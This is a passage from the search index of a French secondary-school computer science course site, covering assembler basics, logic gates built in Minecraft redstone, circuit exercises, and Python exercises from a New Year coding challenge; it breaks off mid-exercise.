\ud83d\udcc8 JG              Sauter \u00e0 une autre instruction si un op\u00e9rande est sup\u00e9rieur \u00e0 l'autre (Jump if Greater).          \ud83d\udcc9 JL              Sauter \u00e0 une autre instruction si un op\u00e9rande est inf\u00e9rieur \u00e0 l'autre (Jump if Less).          <p>L'assembleur n'est pas au programme, mais il permet de mieux comprendre le fonctionnement d'un ordinateur et le fait qu'il soit un mod\u00e8le de machine s\u00e9quentiel.</p> <p>Exemple:</p> <pre><code>STR A, 15 # Stocke 15 dans A\nADD A, 10 # Ajoute 10 \u00e0 la valeur dans A\nSTR B, 10 # Stocke 10 dans B\nLOAD A # Met A dans la m\u00e9moire active\nMUL 10 # Multiplie la valeur dans la m\u00e9moire active par 10\nSTR A # Stocke le r\u00e9sultat de la m\u00e9moire active dans A \nCMP A, B\nboucle:\nJE fin_boucle\nSTR C, 0\nADD B, 1\nADD C,1\nJMP boucle\nfin_boucle\n</code></pre>"},{"location":"premiere/IV-Architecture_d_une_machine/Cours/Cours_4/","title":"Cours 4","text":"\ud83d\udcda Ludop\u00e9dagogie : Redstone dans Minecraft <p>Chapitre IV - Architecture d'une machine</p> \ud83d\udcd6 Pourquoi Minecraft ? \ud83c\udfae Minecraft              Minecraft est un jeu vid\u00e9o sorti en 2009 qui met le joueur dans un mode en 3D cr\u00e9\u00e9 al\u00e9atoirement en utilisant la m\u00e9thode proc\u00e9durale.          \ud83c\udf0d Bruit de Perlin                  Pour faire court, la g\u00e9n\u00e9ration d'un monde Minecraft est al\u00e9atoire gr\u00e2ce \u00e0 du pseudo-al\u00e9atoire au niveau de la cr\u00e9ation des terrains en utilisant un outil math\u00e9matique appel\u00e9 le bruit de Perlin.                                  Le bruit de Perlin est une m\u00e9thode math\u00e9matique utilis\u00e9e pour g\u00e9n\u00e9rer des paysages r\u00e9alistes dans les jeux vid\u00e9o, comme Minecraft. Il permet de cr\u00e9er des terrains qui semblent naturels, avec des montagnes, des vall\u00e9es, et d'autres variations progressives.              \ud83d\udce6 Voxels                  Minecraft est un jeu particulier car il met le joueur dans un monde compos\u00e9 de voxels qui ne sont que des pixels dans un univers en 3 dimensions (pixels \u00e9tant un \u00e9l\u00e9ment dans un univers de 2 dimensions).              \ud83d\udd34 Redstone                  De plus, ce jeu ayant re\u00e7u \u00e9norm\u00e9ment d'\u00e9volutions depuis, a rajout\u00e9 une m\u00e9canique assez novatrice qu'est la redstone.                                  La redstone (ou poudre rouge en fran\u00e7ais) permet de simuler des circuits \u00e9lectriques et de r\u00e9aliser des op\u00e9rations logiques.                       \ud83c\udf04 Utilisation du bruit de Perlin : Dans Minecraft, le bruit de Perlin est utilis\u00e9 pour simuler les reliefs des terrains (collines, montagnes), r\u00e9partir les biomes (d\u00e9serts, for\u00eats, oc\u00e9ans) en r\u00e9partissant l'humidit\u00e9 et la temp\u00e9rature, et g\u00e9n\u00e9rer des variations progressives et coh\u00e9rentes dans le monde.               \ud83d\udca1 Note : Bruit de Perlin         Cette technique fonctionne en g\u00e9n\u00e9rant des \"grilles\" de valeurs qui sont m\u00e9lang\u00e9es et interpol\u00e9es pour cr\u00e9er des transitions progressives. Cela permet de cr\u00e9er des terrains o\u00f9 une montagne peut doucement devenir une plaine, au lieu d'avoir des changements brusques.      \ud83d\udcd6 La notion de Turing-complet \ud83e\udde0 Syst\u00e8me Turing-complet              Un syst\u00e8me est dit Turing-complet s'il peut ex\u00e9cuter tous les calculs possibles qu'un ordinateur peut r\u00e9aliser, \u00e0 condition de disposer de suffisamment de temps et de m\u00e9moire. Cela signifie qu'il peut simuler une machine th\u00e9orique appel\u00e9e machine de Turing.          \ud83c\udfae Minecraft et la Redstone                  Minecraft et la redstone sont consid\u00e9r\u00e9s comme Turing-complets car il est possible, avec les composants du jeu (poudre de redstone, torches, leviers, etc.), de construire des circuits logiques capables d'effectuer des calculs complexes.              \u26a1 Capacit\u00e9s de calcul                  Par exemple, il est possible de :                 \u2022 R\u00e9aliser des additions ou des multiplications.                 \u2022 Cr\u00e9er des m\u00e9moires pour stocker des donn\u00e9es.                 \u2022 Construire un ordinateur entier dans Minecraft capable de jouer \u00e0 Minecraft !                       \ud83d\udca1 Astuce : Pourquoi est-ce important ?         \u00catre Turing-complet signifie que Minecraft avec la redstone peut \u00eatre utilis\u00e9 pour simuler n'importe quel calcul ou programme, tout comme un vrai ordinateur.               \ud83d\udd2c Note : Notion de Turing-Complet La notion de Turing-complet est li\u00e9e \u00e0 l'id\u00e9e de simuler une machine de Turing, un mod\u00e8le th\u00e9orique de calcul invent\u00e9 par Alan Turing. Ce mod\u00e8le, \u00e0 proprement parler, n'est pas au programme du lyc\u00e9e, mais il est int\u00e9ressant de savoir que Minecraft peut \u00eatre aussi puissant, en th\u00e9orie, qu'un ordinateur moderne.      \ud83d\udcd6 Composants de redstone          Il existe un bon nombre de composants en redstone mais uniquement 5 composants seront n\u00e9cessaires pour ce TD.      \ud83d\udd34 Poudre de redstone                  La poudre de redstone est l'\u00e9l\u00e9ment principal des circuits. Elle permet de r\u00e9aliser tous les trac\u00e9s et de relier les composants \u00e0 l'instar d'un c\u00e2ble de cuivre ou d'un trac\u00e9 fait sur une carte-m\u00e8re.              \ud83d\udd04 R\u00e9p\u00e9teur de redstone                  Le r\u00e9p\u00e9teur de redstone permet de redonner de l'intensit\u00e9 au trac\u00e9 de poudre de redstone cr\u00e9\u00e9. En effet, comme pour un vrai c\u00e2ble \u00e9lectrique, on peut retrouver des d\u00e9perditions lors de longues distances.              \ud83d\udca1 Lampe de redstone                  Comme son nom l'indique, la lampe de redstone est une repr\u00e9sentation d'une ampoule que l'on peut relier \u00e0 une platine comme lors des simulations de circuits \u00e9lectroniques au coll\u00e8ge. Elle s'allume si elle re\u00e7oit un courant en entr\u00e9e. Elle nous servira \u00e0 analyser les r\u00e9sultats lors des tests.              \ud83d\udd25 Torche de redstone                  La torche de redstone permet d'alimenter un circuit.              \ud83c\udf9b\ufe0f Leviers ou boutons                  Ces composants permettent au joueur de manipuler les entr\u00e9es du circuits en leur donnant un \u00e9tat fixe (levier) ou temporaire (bouton).              \ud83d\udcd6 Objectifs de la s\u00e9ance \ud83c\udfaf Objectif principal              L'objectif principal de la s\u00e9ance est la r\u00e9alisation de circuits logiques dans Minecraft. Cela permet de se rendre compte de la difficult\u00e9 de cr\u00e9er des circuits logiques compacts et qui sont enti\u00e8rement fonctionnels (c'est \u00e0 dire sans court-circuits par exemple).                   \ud83d\udd27 Comp\u00e9tences \u00e0 d\u00e9velopper : Il faudra ainsi savoir cr\u00e9er les diff\u00e9rentes portes logiques vues dans les cours pr\u00e9c\u00e9dents (AND, OR, NOT) et de les mettre ensemble pour recr\u00e9er des circuits logiques analys\u00e9s dans les exercices.      \ud83d\udcd6 Portes logiques dans Minecraft \u26a1 R\u00e9alisation des portes logiques              Il est possible de r\u00e9aliser toutes les portes logiques dans Minecraft.          \ud83d\udd04 M\u00e9canique d'inversion                  Pour se faire, il existe une m\u00e9canique importante dans Minecraft : l'inversion gr\u00e2ce \u00e0 un bloc.                                  En adossant ou en posant une torche de redstone sur un bloc, si ce bloc re\u00e7oit en entr\u00e9e un courant, celle-ci permet d'inverser le courant (comme une porte NOT).              \ud83d\udcd6 Exercices \ud83d\udeab Porte NOT                  \u2022 Placez un levier, un bloc et une torche de redstone.                 \u2022 Reliez une lampe au circuit.              \ud83d\udd17 Porte AND                  \u2022 Placez deux leviers comme entr\u00e9es.                 \u2022 Reliez-les \u00e0 un circuit qui inclut deux torches de redstone sur 3 blocs et une poudre entre les deux pour relier les deux torches.                 \u2022 Ajoutez une troisi\u00e8me torche sur un bloc pour produire la sortie.                      \u2753 Question : Quand la lampe s'allume-t-elle ?                  \ud83d\udd00 Porte OR                  \u2022 Placez deux leviers.                 \u2022 Reliez-les \u00e0 un circuit commun avec de la poudre de redstone.                 \u2022 Ajoutez une lampe en sortie.                      \u2753 Question : Quand la lampe s'allume-t-elle ?                  \ud83d\udcd6 Circuits combin\u00e9s \ud83d\udeab\ud83d\udd17 Porte NAND                  La porte NAND correspond \u00e0 l'inverse d'une porte AND.                                  \u2022 Une lampe de redstone reli\u00e9e \u00e0 une porte NAND s'\u00e9teint uniquement si au moins une entr\u00e9e est allum\u00e9e, sinon s'allume.                                       \ud83d\udccb Consigne :                     1. Construisez une porte AND.                     2. Retirez la torche de redstone sur le bloc de sortie pour inverser le signal.                  \u26a1 Porte XOR                  La porte XOR correspond au ou exclusif.                                  \u2022 Une lampe de redstone reli\u00e9e \u00e0 une porte XOR est une porte correspondant au ou exclusif : elle s'\u00e9teint si toutes les entr\u00e9es sont activ\u00e9es ou ferm\u00e9es mais s'allume si une seule est activ\u00e9e.                                       \ud83d\udccb Consigne :                     1. D\u00e9duire le sch\u00e9ma logique sur papier.                     2. R\u00e9aliser la construction en jeu.                  \ud83d\udcd6 Sch\u00e9ma combin\u00e9 \ud83d\udd27 Expressions bool\u00e9ennes              R\u00e9aliser les sch\u00e9mas logiques des expressions bool\u00e9ennes suivantes (indication : chacune des entr\u00e9es A, B et C sont des leviers ou des boutons):                          \u2022 A and not B             \u2022 A or C and B \ud83d\udcd6 Pour aller plus loin : D\u00e9fis avanc\u00e9s \ud83e\uddee Demi Additionneur              Un demi additionneur est un circuit logique qui permet d'additionner deux bits.                          Il prend en entr\u00e9e deux bits A et B et produit en sortie :                          \u2022 La somme S (bit de poids faible)             \u2022 La retenue C (carry, bit de poids fort)          \ud83d\udcd0 Sch\u00e9ma logique                  \u2022 S = A XOR B                 \u2022 C = A AND B              \ud83c\udfaf Consigne                  R\u00e9aliser un demi additionneur dans Minecraft avec deux leviers en entr\u00e9e (A et B) et deux lampes en sortie (S et C).              \ud83d\udcd6 Correction          \ud83d\udcda Vous pouvez retrouver les corrections des exercices sur cette ressource externe : Lien vers la correction"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/","title":"Fiche d'exercices : Circuits logiques","text":"<p>Les circuits \u00e9lectroniques sont sch\u00e9matis\u00e9s \u00e0 l'aide des portes logiques qui les contiennent.</p> <p>Chacune des portes logiques (OR, AND, OR etc...) ont leur propre repr\u00e9sentation : en norme am\u00e9ricaine ou norme europ\u00e9enne.</p> <p>Pour les exercices suivants, on utilisera la norme am\u00e9ricaine.</p>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-1-circuits-et-portes","title":"Exercice 1 : Circuits et portes","text":"<p>1. Pour les deux sch\u00e9mas suivants, donner les portes logiques qui les composent. Quelle est la diff\u00e9rence entre ces 2 sch\u00e9mas?</p> <p></p> <p></p> <p>Astuce : il est possible de partir du d\u00e9but et retranscrire tous les r\u00e9sultats des portes logiques.</p> <p>2. Donner la table de v\u00e9rit\u00e9 du deuxi\u00e8me circuit, c'est \u00e0 dire la valeur de la sortie (1 ou 0) en fonction de chacune des combinaisons d'entr\u00e9es possibles.</p> <p>Astuce : il y a \\(2^n\\) cas pour n variable bool\u00e9ennes en entr\u00e9e de circuit. Si 3 variables, il y a \\(2^3=8\\) combinaisons possibles.</p>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-2-circuits-electronique-vers-equations-booleennes","title":"Exercice 2 : Circuits \u00e9lectronique vers \u00e9quations bool\u00e9ennes","text":"<p>Pour chacun de ces circuits, donner l'\u00e9quation bool\u00e9enne correspondante</p> <p></p> <p></p> <p></p>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-3-equations-booleennes-vers-circuit-electronique","title":"Exercice 3 : \u00c9quations bool\u00e9ennes vers Circuit \u00e9lectronique","text":"<p>Pour chacune des \u00e9quations bool\u00e9ennes propos\u00e9es, donner le circuit \u00e9lectronique associ\u00e9.</p> <ol> <li>(a and b) and (b and c)</li> <li>((not a) and b) or (a and (not b))</li> <li>(a and b) or (c and a or b)</li> </ol>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-4-simplification-de-circuits","title":"Exercice 4 : Simplification de circuits","text":"<p>Simplifiez les expressions bool\u00e9ennes suivantes en utilisant les lois de De Morgan et les propri\u00e9t\u00e9s de l'alg\u00e8bre bool\u00e9enne :</p> <ol> <li>not (a and b) or (not a or not b)</li> <li>(a and b) or (a and not b)</li> <li>not (not a or not b) and (a or b)</li> </ol> <p>Rappel des lois principales : - Loi de De Morgan : not(A and B) = (not A) or (not B) - Distributivit\u00e9 : A and (B or C) = (A and B) or (A and C) - Idempotence : A and A = A, A or A = A</p>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-5-analyse-de-circuits-complexes","title":"Exercice 5 : Analyse de circuits complexes","text":"<p>Analysez ce circuit et r\u00e9pondez aux questions :</p> <p>Soit un circuit avec 3 entr\u00e9es A, B, C et une sortie S, d\u00e9fini par : S = (A and B) or (B and C) or (A and C)</p> <p>Questions : 1. Construisez la table de v\u00e9rit\u00e9 compl\u00e8te de ce circuit 2. Dans quels cas la sortie S vaut-elle 1 ? 3. Ce circuit impl\u00e9mente quelle fonction logique ? (Indice : fonction de vote) 4. Combien de portes logiques minimum faut-il pour r\u00e9aliser ce circuit ?</p>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-6-conception-dun-additionneur","title":"Exercice 6 : Conception d'un additionneur","text":"<p>Concevez un circuit additionneur 1 bit :</p> <p>Un additionneur 1 bit prend en entr\u00e9e : - A et B : les deux bits \u00e0 additionner - Cin : la retenue d'entr\u00e9e</p> <p>Et produit en sortie : - S : la somme - Cout : la retenue de sortie</p> <p>Questions : 1. \u00c9tablissez la table de v\u00e9rit\u00e9 de cet additionneur 2. Trouvez les \u00e9quations bool\u00e9ennes pour S et Cout 3. Dessinez le circuit correspondant</p> <p>Aide : S = 1 quand un nombre impair de bits d'entr\u00e9e valent 1</p>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-7-multiplexeur","title":"Exercice 7 : Multiplexeur","text":"<p>Analysez ce multiplexeur 2 vers 1 :</p> <p>Un multiplexeur 2\u21921 a : - Deux entr\u00e9es de donn\u00e9es : D0, D1 - Une entr\u00e9e de s\u00e9lection : S - Une sortie : Y</p> <p>Fonctionnement : - Si S = 0, alors Y = D0 - Si S = 1, alors Y = D1</p> <p>Questions : 1. \u00c9crivez l'\u00e9quation bool\u00e9enne de Y 2. Construisez la table de v\u00e9rit\u00e9 3. Dessinez le circuit avec des portes AND, OR et NOT 4. \u00c0 quoi sert un multiplexeur dans un ordinateur ?</p>"},{"location":"premiere/IV-Architecture_d_une_machine/Exercices/Fiche_Exo/#exercice-8-decodeur","title":"Exercice 8 : D\u00e9codeur","text":"<p>Concevez un d\u00e9codeur 2 vers 4 :</p> <p>Un d\u00e9codeur 2\u21924 a : - Deux entr\u00e9es : A1, A0 - Quatre sorties : Y3, Y2, Y1, Y0</p> <p>Fonctionnement : Une seule sortie est active (=1) \u00e0 la fois, selon la valeur binaire des entr\u00e9es.</p> <p>Questions : 1. Compl\u00e9tez la table de v\u00e9rit\u00e9 :</p> A1 A0 Y3 Y2 Y1 Y0 0 0 ? ? ? ? 0 1 ? ? ? ? 1 0 ? ? ? ? 1 1 ? ? ? ? <ol> <li>\u00c9crivez les \u00e9quations bool\u00e9ennes pour chaque sortie</li> <li>\u00c0 quoi sert un d\u00e9codeur dans l'architecture d'un processeur ?</li> </ol>"},{"location":"premiere/New_Year_Advent/new_year_advent/","title":"Explications : New Year Advent Challenge \ud83e\udd8a\u2744\ufe0f\ud83c\udf89","text":""},{"location":"premiere/New_Year_Advent/new_year_advent/#principe","title":"Principe","text":"<p>Le New Year Advent Challenge est un challenge d'algorithmie propos\u00e9 par les enseignants M. Delplace : enseignant d'informatique dans l'Acad\u00e9mie de Versailles et M. Braun \ud83e\udd8a : enseignant d'informatique \u00e0 Vannes et \u00e9tudiants M. Leal : \u00e9tudiant en master MEEF NSI 2e Ann\u00e9e \u00e0 Lille et M. Boulier : \u00e9tudiant en master MEEF NSI 2e Ann\u00e9e \u00e0 Lille.</p> <p>Ce challenge de code permet aux \u00e9l\u00e8ves de r\u00e9viser et produire des algorithmes pour f\u00eater le d\u00e9compte de la nouvelle ann\u00e9e.</p>"},{"location":"premiere/New_Year_Advent/new_year_advent/#editions-disponibles","title":"\u00c9ditions disponibles","text":"\ud83c\udf8a \u00c9dition 2025-2026 <p>La nouvelle \u00e9dition avec 14 exercices in\u00e9dits sur l'organisation d'\u00e9v\u00e9nements, la gestion des invit\u00e9s et l'analyse de donn\u00e9es.</p> \ud83d\udccb Voir tous les exercices \ud83d\ude80 Commencer Jour 1 \ud83c\udf84 \u00c9dition 2024-2025 <p>L'\u00e9dition originale avec 14 exercices sur la gestion des courses, des budgets et l'organisation de soir\u00e9es.</p> \ud83d\udccb Voir tous les exercices \ud83d\ude80 Commencer Jour 1"},{"location":"premiere/New_Year_Advent/new_year_advent_24_25/","title":"New Year Advent Challenge 2024-2025 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89","text":""},{"location":"premiere/New_Year_Advent/new_year_advent_24_25/#edition-2024-2025","title":"\u00c9dition 2024-2025","text":"\ud83c\udf84 Jour 1 : Calculer le prix des courses Voir l'exercice \ud83c\udf84 Jour 2 : Prix par cat\u00e9gorie Voir l'exercice \ud83c\udf84 Jour 3 : Manque des chips Voir l'exercice \ud83c\udf84 Jour 4 : Soir\u00e9e de gloutons Voir l'exercice \ud83c\udf84 Jour 5 : Liste de courses Voir l'exercice \ud83c\udf84 Jour 6 : Compte \u00e0 rebours Voir l'exercice \ud83c\udf84 Jour 7 : Menu du R\u00e9veillon Voir l'exercice \ud83c\udf84 Jour 8 : Playlist Voir l'exercice \ud83c\udf84 Jour 9 : Karaok\u00e9 Voir l'exercice \ud83c\udf86 Jour 10 : Quizz Voir l'exercice \ud83c\udf86 Jour 11 : Photos Voir l'exercice \ud83c\udf86 Jour 12 : Budget Voir l'exercice \ud83c\udf86 Jour 13 : R\u00e9solutions Voir l'exercice \ud83c\udf86 Jour 14 : Messages secrets Voir l'exercice"},{"location":"premiere/New_Year_Advent/new_year_advent_25_26/","title":"New Year Advent Challenge 2025-2026 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89","text":""},{"location":"premiere/New_Year_Advent/new_year_advent_25_26/#edition-2025-2026","title":"\u00c9dition 2025-2026","text":"\ud83c\udf8a Jour 1 : Gestion des invitations Voir l'exercice \ud83c\udf8a Jour 2 : Planification des activit\u00e9s Voir l'exercice \ud83c\udf8a Jour 3 : Calcul des portions Voir l'exercice \ud83c\udf8a Jour 4 : Organisation des tables Voir l'exercice \ud83c\udf8a Jour 5 : Gestion des allergies Voir l'exercice \ud83c\udf8a Jour 6 : Horaires de transport Voir l'exercice \ud83c\udf8a Jour 7 : D\u00e9coration th\u00e9matique Voir l'exercice \ud83c\udf8a Jour 8 : Jeux et animations Voir l'exercice \ud83c\udf8a Jour 9 : Souvenirs et photos Voir l'exercice \ud83c\udf89 Jour 10 : Bilan financier Voir l'exercice \ud83c\udf89 Jour 11 : Statistiques de participation Voir l'exercice \ud83c\udf89 Jour 12 : \u00c9valuation de la soir\u00e9e Voir l'exercice \ud83c\udf89 Jour 13 : Planification ann\u00e9e suivante Voir l'exercice \ud83c\udf89 Jour 14 : Remerciements automatis\u00e9s Voir l'exercice"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_1/","title":"Jour 1 \ud83c\udf8a\ud83e\udd8a\ud83c\udf89 : Gestion des invitations","text":"<p>Pour organiser une soir\u00e9e du Nouvel An r\u00e9ussie, il faut d'abord bien g\u00e9rer les invitations. Sarah organise une f\u00eate et doit s'assurer que tous ses amis re\u00e7oivent leur invitation et confirment leur pr\u00e9sence.</p> <p>Elle a une liste de contacts avec leurs informations et doit automatiser le processus d'invitation.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_1/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une invitation est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - nom (str)   - email (str)   - telephone (str)   - confirme (bool)</p> <pre><code>invites = [\n    {\"nom\": \"Alice\", \"email\": \"alice@email.com\", \"telephone\": \"0123456789\", \"confirme\": False},\n    {\"nom\": \"Bob\", \"email\": \"bob@email.com\", \"telephone\": \"0987654321\", \"confirme\": True},\n    {\"nom\": \"Charlie\", \"email\": \"charlie@email.com\", \"telephone\": \"0147258369\", \"confirme\": False},\n    {\"nom\": \"Diana\", \"email\": \"diana@email.com\", \"telephone\": \"0369258147\", \"confirme\": True},\n    {\"nom\": \"Eve\", \"email\": \"eve@email.com\", \"telephone\": \"0258147369\", \"confirme\": False},\n    {\"nom\": \"Frank\", \"email\": \"frank@email.com\", \"telephone\": \"0741852963\", \"confirme\": True},\n    {\"nom\": \"Grace\", \"email\": \"grace@email.com\", \"telephone\": \"0852963741\", \"confirme\": False},\n    {\"nom\": \"Henry\", \"email\": \"henry@email.com\", \"telephone\": \"0963741852\", \"confirme\": True}\n]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_1/#exercice-principal","title":"Exercice Principal","text":"<p>Compter les confirmations</p> <p>\u00c9crire une fonction <code>compter_confirmations</code> qui prend en param\u00e8tre une liste d'invit\u00e9s et renvoie le nombre de personnes qui ont confirm\u00e9 leur pr\u00e9sence.</p> <p>La fonction doit parcourir la liste et compter les invit\u00e9s dont le champ 'confirme' est True.</p> <p>Liste des non-confirm\u00e9s</p> <p>\u00c9crire une fonction <code>liste_non_confirmes</code> qui prend en param\u00e8tre une liste d'invit\u00e9s et renvoie une liste contenant les noms des personnes qui n'ont pas encore confirm\u00e9.</p> <p>La fonction doit retourner une liste de cha\u00eenes de caract\u00e8res (les noms).</p> <p>Relance par email</p> <p>\u00c9crire une fonction <code>emails_relance</code> qui prend en param\u00e8tre une liste d'invit\u00e9s et renvoie une liste des adresses email des personnes \u00e0 relancer.</p> <p>Cette fonction doit utiliser la fonction pr\u00e9c\u00e9dente pour identifier les non-confirm\u00e9s et extraire leurs emails.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec la liste d'invit\u00e9s fournie.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_2/","title":"Jour 2 \ud83c\udf8a\ud83e\udd8a\ud83c\udf89 : Planification des activit\u00e9s","text":"<p>Maintenant que les invitations sont g\u00e9r\u00e9es, il faut planifier les activit\u00e9s de la soir\u00e9e. Chaque activit\u00e9 a une dur\u00e9e et certaines ont des contraintes d'horaires.</p> <p>Marc veut optimiser le planning pour que la soir\u00e9e soit parfaitement organis\u00e9e.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_2/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une activit\u00e9 est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - nom (str)   - duree_minutes (int)   - heure_debut (str) au format \"HH:MM\"   - obligatoire (bool)</p> <pre><code>activites = [\n    {\"nom\": \"Accueil des invit\u00e9s\", \"duree_minutes\": 30, \"heure_debut\": \"19:00\", \"obligatoire\": True},\n    {\"nom\": \"Ap\u00e9ritif\", \"duree_minutes\": 60, \"heure_debut\": \"19:30\", \"obligatoire\": True},\n    {\"nom\": \"D\u00eener\", \"duree_minutes\": 90, \"heure_debut\": \"20:30\", \"obligatoire\": True},\n    {\"nom\": \"Jeux de soci\u00e9t\u00e9\", \"duree_minutes\": 45, \"heure_debut\": \"22:00\", \"obligatoire\": False},\n    {\"nom\": \"Karaok\u00e9\", \"duree_minutes\": 60, \"heure_debut\": \"22:45\", \"obligatoire\": False},\n    {\"nom\": \"Compte \u00e0 rebours\", \"duree_minutes\": 15, \"heure_debut\": \"23:45\", \"obligatoire\": True},\n    {\"nom\": \"Feux d'artifice\", \"duree_minutes\": 20, \"heure_debut\": \"00:00\", \"obligatoire\": True},\n    {\"nom\": \"Rangement\", \"duree_minutes\": 30, \"heure_debut\": \"00:20\", \"obligatoire\": False}\n]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_2/#exercice-principal","title":"Exercice Principal","text":"<p>Dur\u00e9e totale des activit\u00e9s obligatoires</p> <p>\u00c9crire une fonction <code>duree_activites_obligatoires</code> qui prend en param\u00e8tre une liste d'activit\u00e9s et renvoie la dur\u00e9e totale en minutes des activit\u00e9s obligatoires.</p> <p>La fonction doit additionner les dur\u00e9es des activit\u00e9s dont le champ 'obligatoire' est True.</p> <p>Convertir heure en minutes</p> <p>\u00c9crire une fonction <code>heure_en_minutes</code> qui prend en param\u00e8tre une cha\u00eene au format \"HH:MM\" et renvoie le nombre de minutes depuis minuit.</p> <p>Exemple : \"19:30\" doit renvoyer 1960 + 30 = 1170 minutes.*</p> <p>Activit\u00e9 la plus longue</p> <p>\u00c9crire une fonction <code>activite_plus_longue</code> qui prend en param\u00e8tre une liste d'activit\u00e9s et renvoie le nom de l'activit\u00e9 qui dure le plus longtemps.</p> <p>En cas d'\u00e9galit\u00e9, renvoyer la premi\u00e8re activit\u00e9 trouv\u00e9e.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec la liste d'activit\u00e9s fournie.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_3/","title":"Jour 3 \ud83c\udf8a\ud83e\udd8a\ud83c\udf89 : Calcul des portions","text":"<p>Pour nourrir tous les invit\u00e9s, il faut calculer les bonnes quantit\u00e9s de nourriture. Chaque plat a des portions recommand\u00e9es par personne et certains invit\u00e9s ont des r\u00e9gimes sp\u00e9ciaux.</p> <p>Lucie doit calculer les quantit\u00e9s exactes \u00e0 pr\u00e9voir pour \u00e9viter le gaspillage.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_3/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Un plat est repr\u00e9sent\u00e9 par un dictionnaire contenant :   - nom (str)   - portion_par_personne (float) en grammes   - vegetarien (bool)   - prix_par_kg (float)</p> <pre><code>plats = [\n    {\"nom\": \"Saumon fum\u00e9\", \"portion_par_personne\": 80.0, \"vegetarien\": False, \"prix_par_kg\": 45.0},\n    {\"nom\": \"Foie gras\", \"portion_par_personne\": 50.0, \"vegetarien\": False, \"prix_par_kg\": 120.0},\n    {\"nom\": \"Salade de quinoa\", \"portion_par_personne\": 120.0, \"vegetarien\": True, \"prix_par_kg\": 8.0},\n    {\"nom\": \"R\u00f4ti de b\u0153uf\", \"portion_par_personne\": 150.0, \"vegetarien\": False, \"prix_par_kg\": 25.0},\n    {\"nom\": \"Gratin dauphinois\", \"portion_par_personne\": 200.0, \"vegetarien\": True, \"prix_par_kg\": 6.0},\n    {\"nom\": \"Tarte aux fruits\", \"portion_par_personne\": 100.0, \"vegetarien\": True, \"prix_par_kg\": 12.0},\n    {\"nom\": \"Fromages\", \"portion_par_personne\": 60.0, \"vegetarien\": True, \"prix_par_kg\": 18.0}\n]\n\nnb_invites = 12\nnb_vegetariens = 3\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_3/#exercice-principal","title":"Exercice Principal","text":"<p>Quantit\u00e9 totale d'un plat</p> <p>\u00c9crire une fonction <code>quantite_plat</code> qui prend en param\u00e8tre un plat (dictionnaire), le nombre d'invit\u00e9s total et le nombre de v\u00e9g\u00e9tariens, et renvoie la quantit\u00e9 totale n\u00e9cessaire en grammes.</p> <p>Si le plat n'est pas v\u00e9g\u00e9tarien, seuls les non-v\u00e9g\u00e9tariens en consomment. Si le plat est v\u00e9g\u00e9tarien, tous les invit\u00e9s en consomment.</p> <p>Co\u00fbt d'un plat</p> <p>\u00c9crire une fonction <code>cout_plat</code> qui prend en param\u00e8tre un plat, le nombre d'invit\u00e9s total et le nombre de v\u00e9g\u00e9tariens, et renvoie le co\u00fbt total du plat.</p> <p>Cette fonction doit utiliser la fonction pr\u00e9c\u00e9dente pour calculer la quantit\u00e9, puis multiplier par le prix au kg. Le r\u00e9sultat doit \u00eatre arrondi \u00e0 2 d\u00e9cimales.</p> <p>Budget total du menu</p> <p>\u00c9crire une fonction <code>budget_total_menu</code> qui prend en param\u00e8tre une liste de plats, le nombre d'invit\u00e9s total et le nombre de v\u00e9g\u00e9tariens, et renvoie le co\u00fbt total du menu.</p> <p>Cette fonction doit utiliser la fonction pr\u00e9c\u00e9dente pour chaque plat. Le r\u00e9sultat doit \u00eatre arrondi \u00e0 2 d\u00e9cimales.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec les donn\u00e9es fournies.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_4/","title":"Jour 4 \ud83c\udf8a\ud83e\udd8a\ud83c\udf89 : Organisation des tables","text":"<p>Pour que la soir\u00e9e se d\u00e9roule bien, il faut organiser les places \u00e0 table. Certains invit\u00e9s se connaissent bien, d'autres moins, et il faut \u00e9viter les conflits tout en favorisant les bonnes ambiances.</p> <p>Thomas doit cr\u00e9er un plan de table optimal pour ses 16 invit\u00e9s.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_4/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Un invit\u00e9 est repr\u00e9sent\u00e9 par un dictionnaire contenant :   - nom (str)   - age (int)   - affinites (list) : liste des noms des personnes qu'il appr\u00e9cie   - incompatibilites (list) : liste des noms des personnes \u00e0 \u00e9viter</p> <pre><code>invites = [\n    